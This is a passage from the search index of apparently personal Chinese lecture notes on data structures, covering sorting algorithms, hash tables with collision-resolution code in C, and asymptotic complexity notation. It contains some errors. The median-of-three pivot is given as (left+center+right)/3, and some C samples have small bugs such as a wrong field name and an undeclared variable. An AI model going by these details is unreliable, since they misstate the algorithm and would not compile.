(int i = 0; i &lt; numElements; ++i, rightEnd--)\n        arr[rightEnd] = tmp[rightEnd];\n}\n</code></pre>"},{"location":"cs/algorithm/ds/summary2/#_7","title":"\u5feb\u901f\u6392\u5e8f","text":"<ul> <li>\u5df2\u77e5\u7684\u5b9e\u9645\u8fd0\u884c\u6700\u5feb\u7684\u6392\u5e8f\u7b97\u6cd5</li> <li>\u9009\u62e9\u4e00\u4e2a\u57fa\u51c6\u5143\u7d20\uff08\u67a2\u8f74 pivot\uff09\uff0c\u5c06\u6570\u7ec4\u5206\u6210\u4e24\u4e2a\u5b50\u6570\u7ec4\uff0c\u5de6\u8fb9\u7684\u5143\u7d20\u90fd\u5c0f\u4e8e\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\uff0c\u53f3\u8fb9\u7684\u5143\u7d20\u90fd\u5927\u4e8e\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\uff0c\u7136\u540e\u5bf9\u4e24\u4e2a\u5b50\u6570\u7ec4\u8fdb\u884c\u5feb\u6392\u3001\u5408\u5e76</li> <li>\u9009\u53d6 pivot<ul> <li>\u9519\u8bef\u65b9\u6cd5\uff1apivot = arr[0]\uff08\u5bf9\u4e8e\u6392\u597d\u5e8f\u7684\u6570\u7ec4\u4ecd\u4f1a\u6d88\u8017 \\(O(N^2)\\) \u7684\u65f6\u95f4\uff09</li> <li>\u5b89\u5168\u65b9\u6cd5\uff1apivot = random element in arr<ul> <li>\u4f46\u968f\u673a\u6570\u751f\u6210\u4e5f\u6709\u5f00\u9500</li> </ul> </li> <li>\u4e09\u6570\u4e2d\u503c\u5206\u5272\u6cd5\uff1apivot = (left + center + right) / 3</li> </ul> </li> <li>\u5212\u5206\u7b56\u7565\uff08\u770b\u4e0d\u61c2 PPT \u5728\u5e72\u4ec0\u4e48\uff09</li> <li>\u5c0f\u6570\u7ec4<ul> <li>\u5bf9\u4e8e\u5c0f\u7684 \\(N\\)\uff08\\(N\\leq 20\\)\uff09\uff0c\u5feb\u901f\u6392\u5e8f\u6162\u4e8e\u63d2\u5165\u6392\u5e8f</li> <li>\u53ef\u4ee5\u5728\u9012\u5f52\u5230 \\(N\\) \u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u6539\u4e3a\u63d2\u5165\u6392\u5e8f</li> </ul> </li> <li>\u6700\u574f\u590d\u6742\u5ea6 \\(O(N^2)\\)</li> <li>\u6700\u4f18\u590d\u6742\u5ea6 \\(O(N\\log N)\\)</li> <li>\u5e73\u5747\u590d\u6742\u5ea6 \\(O(N\\log N)\\)</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_8","title":"\u6876\u6392\u5e8f","text":"<ul> <li>\u5982\u679c\u8f93\u5165\u6570\u636e\u90fd\u5c0f\u4e8e \\(M\\)\uff0c\u5219\u53ef\u4ee5\u7528\u4e00\u4e2a\u5927\u5c0f\u4e3a \\(M\\) \u7684\u6570\u7ec4\u6765\u8bb0\u5f55\u67d0\u4e2a\u503c\u51fa\u73b0\u4e86\u591a\u5c11\u6b21\uff0c\u8fd9\u4e2a\u6570\u7ec4\u79f0\u4e3a\u6876\uff08bucket\uff09</li> <li>\u6876\u521d\u59cb\u5316\u4e3a 0\uff0c\u904d\u5386\u8f93\u5165\u6570\u636e\uff0c\u5c06\u6bcf\u4e2a\u6570\u636e\u5bf9\u5e94\u7684\u6876\u52a0 1</li> <li>\u6700\u540e\u904d\u5386\u6876\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5bf9\u4e8e bucket[x] = y\uff0c\u5c06 x \u8f93\u51fa y \u6b21</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(N+M)\\)</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_9","title":"\u57fa\u6570\u6392\u5e8f","text":"<ul> <li>\u4ece\u4f4e\u4f4d\uff08LSD\uff0cLeast Significant Digit\uff09\u5230\u9ad8\u4f4d\uff08MSB\uff09\uff0c\u5bf9\u6bcf\u4e00\u4f4d\u8fdb\u884c\u8fdb\u884c\u6392\u5e8f</li> <li>\u4f8b\u5982\u5bf9 64, 8, 216, 512, 27, 729, 0, 1, 343, 125 \u8fdb\u884c\u6392\u5e8f<ul> <li>\u7b2c\u4e00\u8f6e\uff0c\u6309\u4e2a\u4f4d\u6570\u6392\u5e8f<ul> <li>0, 1, 512, 343, 64, 125, 216, 27, 8, 729</li> </ul> </li> <li>\u7b2c\u4e8c\u8f6e\uff0c\u6309\u5341\u4f4d\u6570\u6392\u5e8f<ul> <li>(0, 1, 8), (512, 216), (125, 27, 729), 343, 64</li> </ul> </li> <li>\u7b2c\u4e09\u8f6e\uff0c\u6309\u767e\u4f4d\u6570\u6392\u5e8f<ul> <li>(0, 1, 8, 27, 64), 125, 216, 343, 512, 729</li> </ul> </li> <li>\u5b8c\u6210\u6392\u5e8f</li> </ul> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(P(N+B))\\)\uff0c\u5176\u4e2d \\(P\\) \u4e3a\u8f6e\u6570\uff0c\\(N\\) \u4e3a\u5143\u7d20\u4e2a\u6570\uff0c\\(B\\) \u4e3a\u6876\u4e2a\u6570</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_10","title":"\u7a33\u5b9a\u6027","text":"<ul> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u5982\u679c\u5b58\u5728\u4e24\u4e2a\u76f8\u7b49\u7684\u5143\u7d20<ul> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u7a33\u5b9a\u7684</li> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u4e0d\u7a33\u5b9a\u7684</li> </ul> </li> <li>\u7a33\u5b9a\u6392\u5e8f\uff1a\u5192\u6ce1\u3001\u5f52\u5e76\u3001\u63d2\u5165\u3001\u57fa\u6570</li> <li>\u4e0d\u7a33\u5b9a\u6392\u5e8f\uff1a\u5feb\u6392\u3001\u5e0c\u5c14\u3001\u5806\u6392\u3001\u9009\u62e9</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_11","title":"\u54c8\u5e0c","text":"<p>Warning</p> <p>\u8fd9\u90e8\u5206\u7684 PPT \u771f\u7684\u662f\u4e71\u7684\u79bb\u8c31\uff0c\u770b\u7684\u534a\u61c2\u4e0d\u61c2</p>"},{"location":"cs/algorithm/ds/summary2/#_12","title":"\u54c8\u5e0c\u8868","text":"<ul> <li>\u54c8\u5e0c\u8868\uff08hash table\uff09\u4e5f\u79f0\u4e3a\u6563\u5217\u8868\uff0c\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u901a\u8fc7\u628a\u5173\u952e\u5b57\u503c\u6620\u5c04\u5230\u8868\u4e2d\u4e00\u4e2a\u4f4d\u7f6e\u6765\u8bbf\u95ee\u8bb0\u5f55\uff0c\u4ee5\u52a0\u5feb\u67e5\u627e\u7684\u901f\u5ea6<ul> <li>\u652f\u6301\u67e5\u627e\u5173\u952e\u5b57\u662f\u5426\u5728\u8868\u4e2d\u3001\u67e5\u8be2\u5173\u952e\u5b57\u3001\u63d2\u5165\u5173\u952e\u5b57\u3001\u5220\u9664\u5173\u952e\u5b57\u7b49\u64cd\u4f5c</li> <li>\u5173\u952e\u5b57\u4e5f\u79f0\u4e3a\u6807\u8bc6\u7b26\uff08identifier\uff09</li> </ul> </li> <li>\u901a\u5e38\u7528\u4e00\u4e2a\u6570\u7ec4\u6765\u5b9e\u73b0\uff0c\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u69fd\uff08slot\uff09\uff0c\u5373\u591a\u4e2a\u5173\u952e\u5b57\u5bf9\u5e94\u540c\u4e00\u4e2a\u4f4d\u7f6e\u65f6\uff0c\u5c06\u4e0d\u540c\u5173\u952e\u5b57\u5b58\u5728\u540c\u4e00\u4e2a\u4f4d\u7f6e\u7684\u4e0d\u540c\u69fd\u4e2d</li> <li>\u5bf9\u4e8e\u6807\u8bc6\u7b26 \\(x\\)\uff0c\u5b9a\u4e49\u4e00\u4e2a\u54c8\u5e0c\u51fd\u6570 \\(f(x)\\) \u8868\u793a \\(x\\) \u5728\u54c8\u5e0c\u8868 ht[] \u4e2d\u7684\u4f4d\u7f6e\uff08\u7d22\u5f15\uff09</li> <li>\u8bbe\u54c8\u5e0c\u8868 ht \u7684\u5927\u5c0f\u4e3a \\(b\\)\uff08\u5373 \\(f(x)\\) \u503c\u57df\u4e3a \\([0, b-1]\\)\uff09\uff0c\u6700\u591a\u6709 \\(s\\) \u4e2a\u69fd\uff0c\u5219\u5b9a\u4e49\u4ee5\u4e0b\u503c\uff1a<ul> <li>\\(T\\) \u8868\u793a \\(x\\) \u53ef\u80fd\u7684\u4e0d\u540c\u503c\u4e2a\u6570</li> <li>\\(n\\) \u8868\u793a ht \u4e2d\u6240\u6709\u4e0d\u540c\u6807\u8bc6\u7b26\u7684\u4e2a\u6570</li> <li>\u6807\u8bc6\u7b26\u5bc6\u5ea6\u5b9a\u4e49\u4e3a \\(n/T\\)</li> <li>\u88c5\u8f7d\u5bc6\u5ea6\u5b9a\u4e49\u4e3a \\(\\lambda = n/(sb)\\)</li> </ul> </li> <li>\u5f53\u5b58\u5728 \\(i_1 \\neq i_2\\) \u4f46 \\(f(i_1) = f(i_2)\\) \u7684\u60c5\u51b5\uff0c\u5219\u79f0\u4e3a\u53d1\u751f\u4e86\u78b0\u649e\uff08collision\uff09</li> <li>\u5f53\u5c06\u4e00\u4e2a\u65b0\u7684\u6807\u8bc6\u7b26\u6620\u5c04\u5230\u4e00\u4e2a\u6ee1\u7684\u6876\u65f6\uff0c\u5219\u79f0\u4e3a\u53d1\u751f\u4e86\u6ea2\u51fa\uff08overflow\uff09<ul> <li>\u5f53 s = 1 \u65f6\uff0c\u78b0\u649e\u548c\u6ea2\u51fa\u5c06\u540c\u65f6\u53d1\u751f</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_13","title":"\u54c8\u5e0c\u51fd\u6570","text":"<ul> <li>\u54c8\u5e0c\u51fd\u6570\u5e94\u8be5\u6613\u4e8e\u8ba1\u7b97\uff0c\u5e76\u4e14\u51cf\u5c11\u78b0\u649e\u7684\u53ef\u80fd\u6027</li> <li>\u54c8\u5e0c\u51fd\u6570\u5e94\u8be5\u662f unbiased \u7684\uff0c\u5373 \\(P(f(x) = i) = 1/b\\)\uff0c\u8fd9\u79cd\u51fd\u6570\u79f0\u4e3a\u5747\u5300\u54c8\u5e0c\u51fd\u6570\uff08uniform hash function\uff09</li> <li>\u5bf9\u4e8e\u6574\u6570\u7684\u54c8\u5e0c\uff0c\u4f8b\u5982 \\(f(x) = x \\bmod \\mathrm{tableSize}\\)\uff0c\u5176\u4e2d tableSize \u6700\u597d\u9009\u62e9\u4e00\u4e2a\u8d28\u6570\uff0c\u8fd9\u6837\u5bf9\u4e8e\u968f\u673a\u8f93\u5165\uff0c\u5173\u952e\u5b57\u7684\u5206\u5e03\u66f4\u5747\u5300</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_14","title":"\u5206\u79bb\u94fe\u63a5","text":"<ul> <li>\u89e3\u51b3\u51b2\u7a81\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u5206\u79bb\u94fe\u63a5\uff08separate chaining\uff09</li> <li>\u5c06\u54c8\u5e0c\u6620\u5c04\u5230\u540c\u4e00\u4e2a\u503c\u7684\u6240\u6709\u5143\u7d20\u4fdd\u5b58\u5728\u4e00\u4e2a\u5217\u8868\uff08\u94fe\u8868\uff09\u4e2d</li> </ul> \u4ee3\u7801 <pre><code>struct ListNode;\ntypedef struct ListNode *Position;\nstruct HashTbl;\ntypedef struct HashTbl *HashTable;\nstruct ListNode {\n    ElementType Element;\n    Position Next;\n};\ntypedef Position List;\nstruct HashTbl {\n    int TableSize;\n    List *TheLists;\n};\n\nHashTable initializeTable(int tableSize) {\n    HashTable H;\n    if (tableSize &lt; minTableSize) {\n        printf(\"Table size too small\");\n        return NULL;\n    }\n    H = malloc(sizeof(struct HashTbl));\n    if (H == NULL) Error(\"Out of space!!!\");\n    H-&gt;TableSize = nextPrime(tableSize);\n    H-&gt;TheLists = malloc(sizeof(List) * H-&gt;TableSize);\n    if (H-&gt;TheLists == NULL) Error(\"Out of space!!!\");\n    for (int i = 0; i &lt; H-&gt;tableSize; ++i) {\n        H-&gt;TheLists[i] = malloc(sizeof(struct ListNode));\n        if (H-&gt;TheLists[i] == NULL) Error(\"Out of space!!!\");\n        else H-&gt;TheLists[i]-&gt;Next = NULL;\n    }\n    return H;\n}\n\nPosition find(ElementType key, HashTable H) {\n    Position P; List L;\n    L = H-&gt;TheLists[hash(key, H-&gt;TableSize)];\n    P = L-&gt;Next;\n    while (P != NULL &amp;&amp; P-&gt;Element != key) P = P-&gt;Next;\n    return P;\n}\n\nvoid insert(ElementType key, HashTable H) {\n    Position pos, newCell; List L;\n    pos = find(key, H);\n    if (pos == NULL) {\n        newCell = malloc(sizeof(struct ListNode));\n        if (newCell == NULL) Error(\"Out of space!!!\");\n        else {\n            L = H-&gt;TheLists[hash(key, H-&gt;TableSize)];\n            newCell-&gt;Next = L-&gt;Next;\n            newCell-&gt;Element = key;\n            L-&gt;Next = newCell;\n        }\n    }\n}\n</code></pre>"},{"location":"cs/algorithm/ds/summary2/#_15","title":"\u5f00\u653e\u5730\u5740","text":"<ul> <li>\u5f00\u653e\u5730\u5740\uff08open addressing\uff09\u662f\u53e6\u4e00\u79cd\u89e3\u51b3\u51b2\u7a81\u7684\u65b9\u6cd5</li> <li>\u5f53\u6709\u51b2\u7a81\u53d1\u751f\u65f6\uff0c\u5c1d\u8bd5\u9009\u62e9\u5176\u5b83\u5355\u5143\uff0c\u76f4\u5230\u627e\u5230\u7a7a\u7684\u4e3a\u6b62</li> <li>\u5373\u6709\u591a\u4e2a\u54c8\u5e0c\u51fd\u6570 \\(h_0(x), h_1(x), \\cdots\\)\uff0c\u5176\u4e2d \\(h_i(x) = (\\mathrm{hash}(x)+f(i))\\bmod \\mathrm{tableSize}\\)<ul> <li>\u5176\u4e2d \\(f(i)\\) \u4e3a\u589e\u91cf\u51fd\u6570\uff0c\u6709\u591a\u79cd\u9009\u53d6\u7684\u65b9\u5f0f</li> </ul> </li> <li>\u4e00\u822c\u6765\u8bf4 \\(\\lambda &lt; 0.5\\)</li> </ul> <pre><code>void insert(int key) {\n    index = hash(key);\n    int i = 0;\n    while (collision at index) {\n        index = (hash(key) + f(i)) % tableSize;\n        if (table is full) break;\n        else i++;\n    }\n    if (table is full) Error(\"No space left\");\n    else table[index] = key;\n}\n</code></pre>"},{"location":"cs/algorithm/ds/summary2/#_16","title":"\u7ebf\u6027\u63a2\u6d4b","text":"<ul> <li>\u5373\u589e\u91cf\u51fd\u6570\u7684\u9009\u62e9\u4e3a \\(f(i) = i\\)</li> <li>\u5373\u51b2\u7a81\u4e86\u5c31\u5f80\u540e\u4e00\u4e2a\u4e00\u4e2a\u627e\uff0c\u76f4\u5230\u627e\u5230\u7a7a\u7684\u4e3a\u6b62</li> <li>\u4f1a\u5bfc\u81f4\u805a\u96c6\uff08clustering\uff09\uff0c\u5373\u4e00\u65e6\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5143\u7d20\u90fd\u4f1a\u805a\u96c6\u5728\u4e00\u8d77\uff0c\u641c\u7d22\u6b21\u6570\u4f1a\u53d8\u5f97\u975e\u5e38\u5927<ul> <li>\u4f7f\u7528\u7ebf\u6027\u63a2\u6d4b\u7684\u63a2\u6d4b\u6b21\u6570\u5bf9\u4e8e\u63d2\u5165\u548c\u4e0d\u6210\u529f\u67e5\u627e\u6765\u8bf4\u7ea6\u4e3a \\(\\dfrac{1}{2}\\left(1+\\dfrac{1}{(1-\\lambda)^2}\\right)\\)</li> <li>\u5bf9\u4e8e\u6210\u529f\u7684\u67e5\u627e\u6765\u8bf4\u5219\u9700\u8981 \\(\\dfrac{1}{2}\\left(1+\\dfrac{1}{1-\\lambda}\\right)\\) \u6b21</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_17","title":"\u4e8c\u6b21\u63a2\u6d4b","text":"<ul> <li>\u5373 \\(f(i) = i^2\\)</li> <li>\u5982\u679c\u4f7f\u7528\u4e8c\u6b21\u63a2\u6d4b\uff0c\u4e14\u8868\u5927\u5c0f\u4e3a\u8d28\u6570\u65f6\uff0c\u90a3\u4e48\u5f53\u8868\u81f3\u5c11\u6709\u4e00\u534a\u662f\u7a7a\u7684\u65f6\uff0c\u603b\u80fd\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u5143\u7d20</li> <li>\u67e5\u627e<ul> <li>\\(f(i) = f(i-1) + i^2 - (i-1)^2 = f(i-1) + 2i - 1\\) <pre><code>Position find(ElementType key, HashTable H) {\n    Position currentPos = hash(key, H-&gt;TableSize);\n    int collisionNum = 0;\n    while (H-&gt;TheCells[currentPos].Info != Empty &amp;&amp; \n        H-&gt;TheCells[currentPos].Element != key) {\n        currentPos += 2 * ++collisionNum - 1;\n        if (currentPos &gt;= H-&gt;TableSize) currentPos -= H-&gt;TableSize;\n    }\n    return currentPos;\n}\n</code></pre></li> </ul> </li> <li>\u63d2\u5165     <pre><code>void insert(ElementType key, HashTable H) {\n    Position pos = find(key, H);\n    if (H-&gt;TheCells[pos].Info != Legitimate) {\n        H-&gt;TheCells[pos].Info = Legitimate;\n        H-&gt;TheCells[pos].Element = key;\n    }\n}\n</code></pre></li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_18","title":"\u53cc\u91cd\u54c8\u5e0c","text":"<ul> <li>\u5373 \\(f(i) = i * \\mathrm{hash}_2(x)\\)</li> <li>\u4e00\u822c\u9009\u62e9 \\(\\mathrm{hash}_2(x) = R - (x\\bmod R)\\)\uff0c\u5176\u4e2d \\(R\\) \u4e3a\u5c0f\u4e8e\u8868\u5927\u5c0f\u7684\u8d28\u6570</li> <li>\u5982\u679c\u53cc\u91cd\u54c8\u5e0c\u6b63\u786e\u5b9e\u73b0\u4e86\uff0c\u90a3\u4e48\u9884\u671f\u7684\u63a2\u6d4b\u6b21\u6570\u548c\u968f\u673a\u7684\u78b0\u649e\u89e3\u51b3\u7b56\u7565\u51e0\u4e4e\u76f8\u540c\uff08\uff1f\u542c\u4e0d\u61c2\uff09</li> <li>\u4e8c\u6b21\u63a2\u6d4b\u4e0d\u9700\u8981\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u51fd\u6570\uff0c\u6240\u4ee5\u76f8\u6bd4\u4e4b\u4e0b\u4e8c\u6b21\u63a2\u6d4b\u66f4\u7b80\u5355\u5feb\u901f</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_19","title":"\u518d\u54c8\u5e0c","text":"<ul> <li>\u4f7f\u7528\u4e8c\u6b21\u63a2\u6d4b\uff0c\u5982\u679c\u8868\u7684\u5143\u7d20\u8fc7\u591a\uff0c\u90a3\u4e48\u64cd\u4f5c\u65f6\u95f4\u4f1a\u8fc7\u957f\uff0c\u800c\u4e14\u53ef\u80fd\u63d2\u5165\u5931\u8d25</li> <li>\u89e3\u51b3\u65b9\u6cd5\u662f\u518d\u54c8\u5e0c\uff08rehashing\uff09<ul> <li>\u5efa\u7acb\u4e00\u4e2a\u4e24\u500d\u5927\u7684\u54c8\u5e0c\u8868</li> <li>\u626b\u63cf\u539f\u59cb\u54c8\u5e0c\u8868</li> <li>\u5229\u7528\u65b0\u7684\u54c8\u5e0c\u51fd\u6570\u5c06\u5143\u7d20\u6620\u5c04\u5230\u65b0\u7684\u54c8\u5e0c\u503c\uff0c\u5e76\u63d2\u5165</li> </ul> </li> <li>\u5982\u679c\u6709\u539f\u6765\u7684\u54c8\u5e0c\u8868\u6709 \\(N\\) \u4e2a\u5143\u7d20\uff0c\u5219\u518d\u54c8\u5e0c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</li> <li>\u4ec0\u4e48\u65f6\u5019\u8fdb\u884c\u518d\u54c8\u5e0c<ul> <li>\u8868\u586b\u6ee1\u4e00\u534a\u4e86</li> <li>\u63d2\u5165\u5931\u8d25</li> <li>\u5f53\u54c8\u5e0c\u8868\u8fbe\u5230\u4e86\u67d0\u4e00\u4e2a\u7279\u5b9a\u7684\u88c5\u8f7d\u5bc6\u5ea6\u65f6</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/topic1/","title":"\u7b97\u6cd5\u5206\u6790\u57fa\u7840","text":"<p> \u7ea6 711 \u4e2a\u5b57  33 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u6570\u636e\u7ed3\u6784\u57fa\u7840\u7b2c 1 \u81f3 2 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/algorithm/ds/topic1/#_2","title":"\u7b97\u6cd5\u4e0e\u5206\u6790","text":"<ul> <li>\u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u3001\u8ba1\u7b97\u673a\u53ef\u6267\u884c\u7684\u3001\u89e3\u51b3\u67d0\u4e00\u95ee\u9898\u7684\u6709\u9650\u6b65\u9aa4</li> <li>\u9700\u8981\u6709\u4ee5\u4e0b\u7279\u5f81\uff1a<ul> <li>Input</li> <li>Output</li> <li>Definiteness</li> <li>Finiteness</li> <li>Effectiveness</li> </ul> </li> <li>program \u4e0d\u9700\u8981 finite\uff08\u6bd4\u5982\u64cd\u4f5c\u7cfb\u7edf\uff09</li> <li>\u7b97\u6cd5\u5206\u6790\u5185\u5bb9\uff1a<ul> <li>\u8fd0\u884c\u65f6\u95f4\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u6709\u5173</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u3001\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u65e0\u5173</li> </ul> </li> <li>\u590d\u6742\u5ea6\u5206\u6790\u5047\u8bbe<ul> <li>\u6307\u4ee4\u6309\u987a\u5e8f\u6267\u884c</li> <li>\u6240\u6709\u6307\u4ee4\uff08\u8fd0\u7b97\uff09\u90fd\u6d88\u8017\u540c\u4e00\u65f6\u95f4\u5355\u5143</li> <li>\u6570\u636e\u89c4\u6a21\u662f\u7ed9\u5b9a\u7684\uff0c\u4e14\u6709\u65e0\u9650\u7a7a\u95f4</li> </ul> </li> <li>\u4e00\u822c\u9700\u8981\u5206\u6790 \\(T_{\\mathrm{avg}}(N)\\)\uff08\u5e73\u5747\u60c5\u51b5\uff09\u548c \\(T_{\\mathrm{worst}}(N)\\)\uff08\u6700\u5dee\u60c5\u51b5\uff09\uff0c\\(N\\) \u662f\u8f93\u5165\u7684\u6570\u636e\u89c4\u6a21\uff08\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165\u89c4\u6a21\uff09</li> </ul>"},{"location":"cs/algorithm/ds/topic1/#_3","title":"\u590d\u6742\u5ea6\u6e10\u8fdb\u8bb0\u53f7","text":""},{"location":"cs/algorithm/ds/topic1/#_4","title":"\u5b9a\u4e49","text":"<ul> <li>\u5927 \\(O\\) \u8868\u793a\u6cd5 \\(T(N) = O(f(N))\\)\uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\leq c\\cdot f(N)\\)<ul> <li>\u6e10\u8fdb\u4e0a\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u9ad8\u4e8e \\(f(N)\\)\uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u6162\u6216\u76f8\u540c\uff0c&lt;=\uff09</li> </ul> </li> <li>\u5927 \\(\\Omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\Omega(g(N))\\)\uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\geq c\\cdot g(N)\\)<ul> <li>\u6e10\u8fdb\u4e0b\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u4f4e\u4e8e \\(f(N)\\)\uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u5feb\u6216\u76f8\u540c\uff0c&gt;=\uff09 </li> </ul> </li> <li>\u5927 \\(\\Theta\\) \u8868\u793a\u6cd5 \\(T(N) = \\Theta(h(N))\\)\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(T(N) = O(h(N))\\) \u4e14 \\(T(N) = \\Omega(h(N))\\)<ul> <li>\u6e10\u8fdb\u7d27\u786e\u754c\uff0c\u5373 \\(T(N)\\) \u9700\u8981\u4e0e \\(h(N)\\) \u540c\u9636\uff08\u589e\u957f\u901f\u5ea6\u76f8\u540c =\uff09</li> </ul> </li> <li>\u5c0f \\(o\\) \u8868\u793a\u6cd5 \\(T(N) = o(p(N))\\)\uff0c\u5f53 \\(T(N) = O(p(N))\\) \u4e14 \\(T(N)\\ne \\Theta(p(N))\\) \u65f6<ul> <li>\u975e\u6e10\u8fdb\u7d27\u786e\u4e0a\u754c\uff08\\(T(N)\\) \u589e\u957f\u6bd4 \\(p(N)\\) \u6162\uff0c&lt;\uff09</li> </ul> </li> <li>\u5c0f \\(\\omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\omega(p(N))\\)\uff0c\u5f53 \\(T(N) = \\Omega(q(N))\\) \u4e14 \\(T(N)\\ne \\Theta(q(N))\\) \u65f6<ul> <li>\u975e\u6e10\u8fdb\u7d27\u786e\u4e0b\u754c\uff08\\(T(N)\\) \u589e\u957f\u6bd4 \\(q(N)\\) \u5feb\uff0c&gt;\uff09</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/topic1/#_5","title":"\u89c4\u5219","text":"<ul> <li>\u5982\u679c \\(T_1(N) = O(f(N))\\) \u4e14 \\(T_2(N) = O(g(N))\\)\uff0c\u5219\uff1a<ul> <li>\\(T_1(N) + T_2(N) = \\mathrm{max}(O(f(N)), O(g(N)))\\)</li> <li>\\(T_1(N)\\cdot T_2(N) = O(f(N)\\cdot g(N))\\)</li> </ul> </li> <li>\u5982\u679c \\(T(N)\\) \u662f \\(N\\) \u7684 \\(k\\) \u6b21\u591a\u9879\u5f0f\uff0c\u5219 \\(T(N) = \\Theta(N^k)\\)</li> <li>\u5bf9\u4e8e\u4efb\u610f\u5e38\u6570 \\(k\\) \u5747\u6709 \\(\\log^kN = O(N)\\)</li> <li>\u5927 O \u8bb0\u53f7\u6bd4\u8f83\uff1aBig O Cheat Sheet</li> <li>\u5206\u6790\u89c4\u5219\uff1a<ul> <li>for \u5faa\u73af\u7684\u8fd0\u884c\u65f6\u95f4\u662f\u5faa\u73af\u5185\u90e8\u8bed\u53e5\u7684\u6700\u957f\u65f6\u95f4\uff08\u542b for \u5224\u65ad\uff09\u4e58\u5faa\u73af\u6b21\u6570</li> <li>\u5d4c\u5957 for \u5faa\u73af\u8981\u9010\u6b21\u76f8\u4e58</li> <li>if else \u8bed\u53e5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u8d85\u8fc7\u5224\u65ad\u65f6\u95f4+\u8017\u65f6\u6700\u957f\u7684\u8bed\u53e5\u5757\u7684\u8fd0\u884c\u65f6\u95f4</li> </ul> </li> <li>\u8865\u5145\uff1a\u4e3b\u5b9a\u7406\u3002\u5047\u8bbe\u6709 \\(T(n) = aT(n/b)+f(n)\\)\uff08\\(a\\geq 1, b&gt;1\\)\uff09\uff0c\u5219\uff1a<ul> <li>\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon &gt; 0\\) \u6709 \\(f(n) = O(n^{\\log_ba-\\epsilon})\\)\uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_ba})\\)</li> <li>\u5982\u679c \\(f(n) = \\Theta(n^{\\log_ba})\\) \u5219 \\(T(n) = \\Theta(n^{\\log_ba}\\log n)\\)</li> <li>\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon &gt; 0\\) \u6709 \\(f(n) = \\Omega(n^{\\log_ba+\\epsilon})\\)\uff0c\u540c\u65f6\u5b58\u5728\u5e38\u6570 \\(c&lt;1\\) \u4f7f\u5f97\u5bf9\u4e8e\u5145\u5206\u5927 \\(n\\) \u6709 \\(af(n/b)\\leq cf(n)\\) \u5219 \\(T(N) = \\Theta(f(n))\\)</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/topic1/#_6","title":"\u4f8b\uff1a\u6700\u5927\u5b50\u5e8f\u5217\u548c\u95ee\u9898","text":""},{"location":"cs/algorithm/ds/topic1/#on3","title":"O(N\u00b3)","text":"<p>\u76f4\u63a5\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u5e76\u8ba1\u7b97\u4e2d\u95f4\u5b50\u5e8f\u5217\u548c\uff1a <pre><code>int MaxSubsequenceSum(const int a[], int N) {\n    int res = 0;\n    for (int i = 0; i &lt; N; ++i) {\n        for (int j = i; j &lt; N; ++j) {\n            int now = 0;\n            for (k = i; k &lt;= j; ++k) {\n                now += a[k];\n            }\n            res = max(res, now);\n        }\n    }\n    return res;\n} 